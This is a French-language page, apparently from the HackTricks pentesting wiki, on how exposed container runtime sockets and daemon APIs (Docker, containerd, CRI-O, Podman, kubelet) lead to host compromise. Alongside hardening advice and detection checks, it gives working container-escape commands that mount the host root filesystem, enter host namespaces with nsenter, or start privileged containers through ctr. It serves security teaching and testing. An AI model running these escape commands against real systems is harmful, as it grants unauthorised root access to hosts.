# Runtime API And Daemon Exposure

{{#include ../../../banners/hacktricks-training.md}}

## Vue d'ensemble

De nombreuses compromissions réelles de conteneurs ne commencent pas du tout par une fuite de namespace. Elles commencent par un accès au plan de contrôle du runtime. Si une charge de travail peut communiquer avec `dockerd`, `containerd`, CRI-O, Podman, ou kubelet via un Unix socket monté ou un écouteur TCP exposé, l'attaquant peut être capable de demander un nouveau conteneur avec des privilèges accrus, monter le système de fichiers de l'hôte, rejoindre les namespaces de l'hôte, ou récupérer des informations sensibles du node. Dans ces cas, l'API du runtime est la véritable frontière de sécurité, et la compromettre revient fonctionnellement à compromettre l'hôte.

C'est pourquoi l'exposition des sockets runtime doit être documentée séparément des protections du noyau. Un conteneur avec un seccomp, des capabilities, et une MAC confinement ordinaires peut toujours être à un appel d'API près d'une compromission de l'hôte si `/var/run/docker.sock` ou `/run/containerd/containerd.sock` est monté à l'intérieur. L'isolation par le noyau du conteneur en cours peut fonctionner exactement comme prévu tandis que le plan de gestion du runtime reste entièrement exposé.

## Modèles d'accès au daemon

Docker Engine expose traditionnellement son API privilégiée via le socket Unix local à `unix:///var/run/docker.sock`. Historiquement, il a aussi été exposé à distance via des écouteurs TCP comme `tcp://0.0.0.0:2375` ou un écouteur TLS protégé sur `2376`. Exposer le daemon à distance sans TLS robuste et une authentification client transforme effectivement l'API Docker en une interface root distante.

containerd, CRI-O, Podman, et kubelet exposent des surfaces d'impact similaires. Les noms et les flux de travail diffèrent, mais la logique est la même. Si l'interface permet à l'appelant de créer des workloads, monter des chemins de l'hôte, récupérer des identifiants, ou modifier des conteneurs en cours d'exécution, l'interface est un canal de gestion privilégié et doit être traitée comme tel.

Les chemins locaux courants à vérifier sont :
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Les stacks plus anciennes ou plus spécialisées peuvent aussi exposer des endpoints tels que `dockershim.sock`, `frakti.sock` ou `rktlet.sock`. Ceux-ci sont moins courants dans les environnements modernes, mais lorsqu'ils sont rencontrés ils doivent être traités avec la même prudence car ils représentent des surfaces de contrôle d'exécution plutôt que de simples sockets d'application.

## Accès distant sécurisé

Si un daemon doit être exposé au-delà du socket local, la connexion doit être protégée par TLS et de préférence par authentification mutuelle afin que le daemon vérifie le client et que le client vérifie le daemon. L'ancienne habitude d'ouvrir le Docker daemon en HTTP en clair par commodité est l'une des erreurs les plus dangereuses en administration de conteneurs, car la surface de l'API est suffisamment puissante pour créer directement des conteneurs privilégiés.

Le modèle historique de configuration Docker ressemblait à :
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Sur les hôtes basés sur systemd, la communication du daemon peut aussi apparaître comme `fd://`, ce qui signifie que le processus hérite d'un socket pré-ouvert par systemd au lieu de le lier directement. La leçon importante n'est pas la syntaxe exacte mais la conséquence pour la sécurité. Dès que le daemon écoute au-delà d'un socket local aux permissions strictes, la sécurité du transport et l'authentification des clients deviennent obligatoires plutôt que des mesures de durcissement optionnelles.

## Abus

Si un socket runtime est présent, confirmez lequel c'est, s'il existe un client compatible, et si un accès HTTP brut ou gRPC est possible :
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Ces commandes sont utiles car elles permettent de distinguer un chemin mort, un socket monté mais inaccessible, et une API privilégiée active. Si le client réussit, la question suivante est de savoir si l'API peut lancer un nouveau container avec un host bind mount ou host namespace sharing.

### Exemple complet: Docker Socket To Host Root

Si `docker.sock` est accessible, l'évasion classique consiste à démarrer un nouveau container qui monte le système de fichiers racine de l'hôte puis à faire un `chroot` dedans :
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Cela fournit une exécution directe host-root via le Docker daemon. L'impact ne se limite pas à la lecture de fichiers. Une fois à l'intérieur du nouveau container, l'attacker peut modifier les host files, récupérer des credentials, implanter de la persistence, ou démarrer des privileged workloads supplémentaires.

### Exemple complet : Docker Socket To Host Namespaces

Si l'attacker préfère une entrée en namespace plutôt qu'un accès limité au filesystem :
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Ce chemin atteint l'hôte en demandant au runtime de créer un nouveau container avec exposition explicite du host-namespace plutôt qu'en exploitant celui en cours.

### Exemple complet : containerd Socket

Un socket `containerd` monté est généralement tout aussi dangereux :
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
L'impact est à nouveau la compromission de l'hôte. Même si les outils spécifiques à Docker sont absents, une autre API d'exécution peut toujours offrir le même pouvoir administratif.

## Vérifications

Le but de ces vérifications est de déterminer si le conteneur peut atteindre un quelconque plan de gestion qui aurait dû rester en dehors du périmètre de confiance.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
Ce qui est intéressant ici :

- Un socket runtime monté est généralement un primitif administratif direct plutôt qu'une simple divulgation d'information.
- Un écouteur TCP sur `2375` sans TLS doit être considéré comme une condition de compromission distante.
- Les variables d'environnement telles que `DOCKER_HOST` révèlent souvent que la charge de travail a été intentionnellement conçue pour communiquer avec le runtime de l'hôte.

## Paramètres par défaut du runtime

| Runtime / plateforme | État par défaut | Comportement par défaut | Affaiblissements manuels courants |
| --- | --- | --- | --- |
| Docker Engine | Socket Unix local par défaut | `dockerd` écoute sur le socket local et le daemon s'exécute généralement en root | montage de `/var/run/docker.sock`, exposition de `tcp://...:2375`, TLS faible ou absent sur `2376` |
| Podman | CLI sans daemon par défaut | Aucun daemon privilégié de longue durée n'est requis pour l'usage local ordinaire ; des sockets API peuvent toutefois être exposés lorsque `podman system service` est activé | exposition de `podman.sock`, exécution large du service, utilisation de l'API en root |
| containerd | Socket local privilégié | API administrative exposée via le socket local et généralement consommée par des outils de niveau supérieur | montage de `containerd.sock`, accès large via `ctr` ou `nerdctl`, exposition de namespaces privilégiés |
| CRI-O | Socket local privilégié | L'endpoint CRI est destiné aux composants de confiance locaux au nœud | montage de `crio.sock`, exposition de l'endpoint CRI à des workloads non fiables |
| Kubernetes kubelet | API de gestion locale au nœud | Le kubelet ne devrait pas être largement accessible depuis les Pods ; l'accès peut exposer l'état des pods, des identifiants et des fonctionnalités d'exécution selon authn/authz | montage de sockets kubelet ou de certificats, auth kubelet faible, host networking plus endpoint kubelet accessible |
